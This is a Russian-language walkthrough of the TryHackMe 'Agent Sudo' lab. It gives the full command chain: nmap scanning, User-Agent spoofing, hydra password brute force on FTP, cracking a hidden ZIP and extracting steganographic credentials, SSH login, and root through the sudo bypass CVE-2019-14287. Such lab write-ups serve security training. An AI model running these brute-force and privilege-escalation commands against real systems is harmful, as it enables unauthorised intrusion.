# Agent Sudo — TryHackMe Writeup

**Сложность:** Easy  
**Платформа:** TryHackMe  

---

## 🛠 Разведка (Enumeration)

Запустил сканирование портов и сервисов с помощью `nmap`:

```bash
nmap -sV -sC TARGET_IP

Результаты сканирования:

    21/tcp — FTP (vsftpd 3.0.3)

    22/tcp — SSH (OpenSSH)

    80/tcp — HTTP (Apache httpd 2.4.29)

🌐 Веб-разведка (Web & User-Agent Spoofing)

При переходе на веб-сайт на порту 80 обнаружил сообщение о том, что доступ открыт только для определенных «агентов».

Использовал curl для фаззинга заголовка User-Agent, подставляя буквы алфавита:
Bash

curl -H "User-Agent: C" -L http://TARGET_IP/

Перебор показал, что с заголовком User-Agent: C происходит редирект на страницу, где упоминается имя пользователя chris.
📁 FTP Enumeration & Brute Force

Запустил перебор пароля для пользователя chris на FTP через hydra:
Bash

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP

После получения пароля подключился к FTP-серверу:
Bash

ftp TARGET_IP

Скачал обнаруженные файлы: cutie.png, cute-alien.jpg и текстовое сообщение.
🔍 Стеганография и извлечение данных
1. Извлечение ZIP из PNG (foremost)

Запустил foremost для поиска вложенных файлов в cutie.png:
Bash

foremost -i cutie.png -o extracted

В папке extracted/zip/ был обнаружен зашифрованный архив 00000067.zip.
2. Взлом ZIP-архива (zip2john & john)

Извлек хэш пароля из архива:
Bash

zip2john extracted/zip/00000067.zip > zip.hash

Подобрал пароль со словарем rockyou.txt:
Bash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

Извлек файл To_agentR.txt с помощью 7z:
Bash

7z x extracted/zip/00000067.zip

В файле была найдена подсказка/пароль для стеганографии.
3. Извлечение из JPG (steghide)

Использовал найденный пароль для извлечения скрытого сообщения из cute-alien.jpg:
Bash

steghide extract -sf cute-alien.jpg

Получил файл message.txt, содержащий логин и пароль SSH для пользователя james.
🚀 Первоначальный доступ (Initial Access)

Подключился к целевой машине по SSH:
Bash

ssh james@TARGET_IP

Проверил текущего пользователя и забрал user.txt:
Bash

whoami
# Output: james

cat /home/james/user.txt

👑 Повышение привилегий (Privilege Escalation)

Проверил sudo-права пользователя:
Bash

sudo -l

Вывод:
Plaintext

(ALL, !root) NOPASSWD: /bin/bash

Пользователю james разрешено выполнять /bin/bash от имени любых пользователей, кроме root.

Использовал известную уязвимость CVE-2019-14287 (Sudo Privilege Escalation), передав UID -1:
Bash

sudo -u '#-1' /bin/bash

Проверил получение root-прав и забрал финальный флаг:
Bash

whoami
# Output: root

cat /root/root.txt

💡 Выводы и усвоенные уроки

    Подмена заголовков (User-Agent Spoofing) может открывать доступ к скрытому веб-контенту.

    Стеганография часто требует комбинирования нескольких инструментов (foremost, zip2john, steghide).

    Уязвимости в конфигурации sudo (например, CVE-2019-14287) позволяют обойти явный запрет на выполнение команд от root.
